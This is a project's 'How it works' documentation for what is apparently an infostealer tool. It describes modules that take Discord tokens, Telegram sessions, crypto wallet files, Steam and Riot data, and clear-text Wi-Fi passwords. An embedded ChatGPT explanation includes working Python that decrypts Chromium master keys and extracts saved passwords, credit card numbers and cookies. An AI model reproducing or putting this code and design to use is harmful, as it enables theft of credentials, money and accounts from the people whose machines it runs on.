---
title: How it works
sidebar_label: How it works
---


## `./config` directory

the `./config` folder is what saves the basic configurations and supports the modules and the functionality of the tool

### `./config/colors.py`

- Helps to output colored text to the terminal. [Click here](https://stackoverflow.com/questions/287871/how-do-i-print-colored-text-to-the-terminal) to learn more.

### `./config/constants.py`

- Contains main settings for the tool to refer to and use during its runtime.

### `./config/manager.py`

- Modules inherit from the ModuleManager class to facilitatse console output, logging, file operations easily.

## `./modules` directory

this is where it all happens

### `./modules/applications/discord.py`

- Display the banner and start using the tool
- Data decryption funcions:
   - `GetData`: A utility function that extracts data from a `DATA_BLOB` structure
   - `CryptUnprotectData`: Utilizes the Windows API function `CryptUnprotectData` to decrypt encrypted bytes
   - `DecryptValue`: Decrypts a given buffer using AES encryption
- Check if `Local State` file exists in the discord's installation directory
- Gets the master key from `Local State` file, decrypt it and load it 
- Search to relevant logs and database files inside the `Local Storage/leveldb` dir
- extract and decrypt tokens using the masterkey
- add to our own seperate list to to save if its unique
- all these steps happens for all the discord versions with their own different installation paths (note that the internal structure is the same as they are all based on the same technology)

### `./modules/applications/zip.py`

creates .zip archives of the directories mentioned below (some folders have been excluded in some paths as they are useless)

1. **Telegram Desktop:**
   - `f"{Constant.roaming_dir}\\Telegram Desktop\\tdata"`
   - What it might have:
     - User data such as chat history, settings, and media
     - Configuration files related to Telegram Desktop
     - Cached files for images, media, and emojis
2. **Atomic Wallet:**
   - `f"{Constant.roaming_dir}\\tomic\\Local Storage\\leveldb"`
   - What it might have:
     - Local storage data for the Atomic Wallet application
     - LevelDB files containing user-specific information
3. **Exodus:**
   - `f"{Constant.roaming_dir}\\Exodus\\exodus.wallet"`
   - What it might have:
     - Wallet data and configuration files for the Exodus cryptocurrency wallet
     - Information related to cryptocurrency transactions and holdings
4. **Steam:**
   - `"C:\\Program Files (x86)\\Steam\\config"`
   - What it might have:
     - Steam client configuration files
     - Settings and preferences for the Steam gaming platform
5. **NationsGlory:**
   - `f"{Constant.roaming_dir}\\NationsGlory\\Local Storage\\leveldb"`
   - What it might have:
     - Local storage data for the NationsGlory application
     - LevelDB files containing game-related information
6. **RiotClient:**
   - `f"{Constant.local_dir}\\Riot Games\\Riot Client\\Data"`
   - What it might have:
     - Data related to the RiotClient for games like League of Legends
     - Configuration files, logs, or cached data

### `./modules/browsers/bookmarks.py`

- My implementation was slow compared to [this awesome python module](https://github.com/browser-history/browser-history) that can be installed via `pip install browser-history`

### `./modules/browsers/history.py`

- My implementation was slow compared to [this awesome python module](https://github.com/browser-history/browser-history) that can be installed via `pip install browser-history`

### `./modules/browsers/chromium.py`

- I still have a couple of doubts about how it works... 

<details>
<summary>How ChatGPT (GPT-3.5) explained it:</summary>
<p>

#### Query 1: how does it work? im pretty technical, so give me the inner workings / main functionality of how everything works: [code]

#### Result 1:

This script is a Python program that aims to recover sensitive information (such as passwords, cookies, credit card details, and web history) from Chromium-based browsers. It is adapted and improved from a source provided in the comments.

Let's break down its main functionality:

##### 1. Initialization

- **Importing Libraries:** The script imports necessary libraries for working with file operations, encryption, and database handling.
- **Class Definition:** The script defines a class (`ChromiumRecovery`) that inherits from `ModuleManager`. It handles the recovery of information from Chromium-based browsers.

##### 2. Configuration and Setup

- **Banner Display:** The script displays an ASCII art banner to signify the beginning of the tool's execution.
- **Browser Paths:** It defines paths for various Chromium-based browsers, including Google Chrome, Microsoft Edge, Mozilla Firefox, Brave, etc.
- **Initialization:** The script sets up the output folder structure and initializes some variables and constants.

##### 3. Information Extraction

- **Master Key Extraction:** The `__get_master_key` function attempts to extract the master key used for encrypting sensitive information from the browser's local state file.
- **Password Decryption:** The `__decrypt_password` function decrypts the encrypted password using the master key.
- **Data Retrieval Functions:**
  - `__get_login_data`: Retrieves saved login data (URL, username, decrypted password) from the browser's Login Data database.
  - `__get_credit_cards`: Retrieves credit card details (name, decrypted card number, expiration date) from the browser's Web Data database.
  - `__get_cookies`: Retrieves cookies (host key, cookie name, decrypted cookie value, expiration date) from the browser's Cookies database.
  - `__get_web_history`: Retrieves web history (URL, title, last visit time) from the browser's History database (commented out by default due to potential slowness).

##### 4. Results Handling

- **Result Saving:** The script saves the extracted information into text files organized by browser type, profile, and data type (login, cookies, etc.).
- **Folder Creation:** It creates folders to organize the saved information.

##### 5. Execution

- **Browser Detection:** The script identifies installed Chromium-based browsers on the system.
- **Profile Loop:** For each browser and profile combination, it attempts to recover login data, credit cards, cookies, and web history.
- **Error Handling:** The script includes error handling to log issues if they occur during the extraction process.

##### 6. Note

- **History Processing (Optional):** There is commented-out code that would process web history. This part is left out by default due to potential slowness, and the script copies the history database for later processing.

##### 7. Logging

- **Debugging Messages:** The script includes debugging messages (`self.mdebug`, `self.mprint`, `self.merror`) to provide information about the progress and potential issues.

##### 8. Execution

- **Main Execution Block:** The script is structured to be run as a standalone module or part of a larger system. When executed, it goes through the process of recovering data from Chromium-based browsers.

##### 9. Miscellaneous

- **MIT License:** The script includes the MIT License for open-source use.

This script essentially acts as a password recovery tool, attempting to decrypt and extract sensitive information stored by Chromium-based browsers on the system.

#### Query 2: tell me everything in detail, about 3. Information Extraction

#### Result 1:

Certainly, let's delve into the details of the information extraction part of the script, specifically the functions responsible for retrieving login data, credit cards, cookies, and web history.

##### 3.1 Master Key Extraction

The `__get_master_key` function attempts to extract the master key used for encrypting sensitive information from the browser's local state file.

```python
def __get_master_key(self, browser_path: str, browser_name: str = None) -> bytes:
    if not os.path.exists(browser_path):
        return

    filename = browser_path + "\\Local State"
    with open(filename, "r", encoding="utf-8") as f:
        c = f.read()
        if 'os_crypt' not in c:
            self.merror(
                f"Unable to get master key for {browser_name} Browser, 'os_crypt' is cannot be found in {filename}")
            return

        local_state = json.loads(c)

    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
    self.mdebug(
        f"Got Master Key for {browser_name} Browser at PATH: {browser_path}")
    return master_key
```

- **Input:**
  - `browser_path`: The path to the Chromium-based browser.
  - `browser_name`: A string representing the name of the browser.

- **Output:**
  - Returns the extracted master key as bytes.

- **Details:**
  - The function reads the local state file of the browser to extract the encrypted key (`os_crypt`).
  - It decodes the base64-encoded key and uses `CryptUnprotectData` to decrypt it.
  - The master key is returned.

##### 3.2 Password Decryption

The `__decrypt_password` function decrypts the encrypted password using the master key.

```python
def __decrypt_password(self, buff: bytes, master_key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()
    return decrypted_pass
```

- **Input:**
  - `buff`: The encrypted password as bytes.
  - `master_key`: The master key used for decryption.

- **Output:**
  - Returns the decrypted password as a string.

- **Details:**
  - The function extracts the initialization vector (IV) and payload from the encrypted buffer.
  - It uses the master key and AES encryption to decrypt the payload.
  - The decrypted password is returned after decoding from bytes to a string.

##### 3.3 Data Retrieval Functions

Now, let's look at the functions responsible for retrieving specific types of data from the browser's database.

##### 3.3.1 `__get_login_data`

This function retrieves saved login data (URL, username, decrypted password) from the browser's Login Data database.

```python
def __get_login_data(self, path: str, profile: str, master_key: bytes, browser_name: str) -> str:
    # ... (previously explained)
    for row in cursor.fetchall():
        try:
            password = self.__decrypt_password(row[2], master_key)
        except Exception as e:
            self.merror(
                f"[{browser_name}] [{profile}] [passwords] Error in decrypting the password for {row[1]} -> {row[2]} -> {e}")
            password = "Error. Check the log"
        result += f"""\nURL: {row[0]}\nEmail: {row[1]}\nPassword: {password}"""
        result += Constant.seperator
    # ... (closing database connection)
```

##### 3.3.2 `__get_credit_cards`

This function retrieves credit card details (name, decrypted card number, expiration date) from the browser's Web Data database.

```python
def __get_credit_cards(self, path: str, profile: str, master_key: bytes, browser_name: str) -> str:
    # ... (previously explained)
    for row in cursor.fetchall():
        if not row[0] or not row[1] or not row[2] or not row[3]:
            continue
        try:
            card_number = self.__decrypt_password(row[3], master_key)
        except Exception as e:
            self.merror(
                f"[{browser_name}] [{profile}] [cards] Error in decrypting the Card Number for {row[0]} -> {row[3]} -> {e}")
            card_number = "Error. Check the log"
        result += f"""\nName On Card: {row[0]}\nCard Number: {card_number}\nExpires On:  {row[1]} / {row[2]}\nAdded On: {datetime.fromtimestamp(row[4])}"""
        result += Constant.seperator
    # ... (closing database connection)
```

##### 3.3.3 `__get_cookies`

This function retrieves cookies (host key, cookie name, decrypted cookie value, expiration date) from the browser's Cookies database.

```python
def __get_cookies(self, path: str, profile: str, master_key: bytes, browser_name: str) -> str:
    # ... (previously explained)
    for row in cursor.fetchall():
        if not row[0] or not row[1] or not row[2] or not row[3]:
            continue

        try:
            cookie = self.__decrypt_password(row[

3], master_key)
        except Exception as e:
            self.merror(
                f"[{browser_name}] [{profile}] [cookies] Error in decrypting the cookies for {row[1]} -> {row[3]} -> {e}")
            cookie = "Error. Check the log"

        result += f"""\nHost Key : {row[0]}\nCookie Name : {row[1]}\nPath: {row[2]}\nCookie: {cookie}\nExpires On: {row[4]}"""
        result += Constant.seperator
    # ... (closing database connection)
```

##### 3.3.4 `__get_web_history`

This function retrieves web history (URL, title, last visit time) from the browser's History database (commented out by default due to potential slowness).

```python
def __get_web_history(self, path: str, profile: str, browser_name: str) -> str:
    # ... (previously explained)
    return result
```

##### 3.4 Results Handling

After data retrieval, the script handles the results by saving them into text files organized by browser type, profile, and data type (login, cookies, etc.).

```python
def save_results(self, browser_name, data_type, content, profile) -> None:
    # ... (previously explained)
```

This function creates folders to organize the saved information and writes the content to text files.

##### 3.5 Execution

The script, when executed, goes through the process of recovering data from Chromium-based browsers by calling these functions appropriately for each browser and profile.

This concludes the detailed explanation of the information extraction part of the script.

</p>
</details>



### `./modules/network/network.py`


- runs the `ipconfig /all` command. it provides detailed information about the network interfaces and their config
- runs the `get-wmiobject Win32_NetworkAdapterConfiguration` command in powershell, to get information about network adapter configs.
- runs the `Get-NetAdapter -physical| where status -eq 'up'` command in powershell, listing physical network adapters with an a status of 'up'
- runs the `powershell Get-NetIPConfiguration -All` command in powershell, to gather detailed IP configuration information

### `./modules/network/wifi_passwords.py`

- runs `netsh wlan show profiles` to get a list of all Wi-Fi connected wifi networks.
- extract wifi names / SSIDs
- iterated over each wifi name:
   - Runs `netsh wlan show profile <profile_name> key=clear` to get detailed information about that network, with the wifi password in plain text
   - extract it and save it
- note that this only works with windows installations with their languages set to English or French

### `./modules/systeminfo/system.py`

- the `systeminfo()` function runs the `systeminfo` command and saves it output accordingly 
- the `computerinfo()` function runs the `Get-ComputerInfo` command and saves it output accordingly 
- the `motherboard()` function runs the `Get-WmiObject win32_baseboard` command and saves it output accordingly 
- the `cpu()` function runs the `Get-WmiObject -Class Win32_Processor -ComputerName. | Select-Object -Property [a-z]*` command and saves it output accordingly 
- the `sound()` function runs the `Get-CimInstance win32_sounddevice | fl *` command and saves it output accordingly 


